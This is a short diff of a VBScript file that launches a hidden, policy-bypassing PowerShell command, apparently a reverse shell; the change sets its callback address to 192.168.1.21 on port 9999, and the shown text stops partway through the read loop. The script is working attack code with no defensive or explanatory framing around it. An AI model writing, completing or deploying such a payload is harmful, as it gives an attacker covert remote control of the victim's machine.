@@ -1,6 +1,6 @@
 Set objShell = CreateObject("WScript.Shell")
 command = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command " & _
-    "\"$client = New-Object System.Net.Sockets.TCPClient('0.0.0.0',9999);" & _
+    "\"$client = New-Object System.Net.Sockets.TCPClient('192.168.1.21',9999);" & _
     "$stream = $client.GetStream();" & _
     "[byte[]]$bytes = 0..65535|%%{0};" & _
     "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){" & _
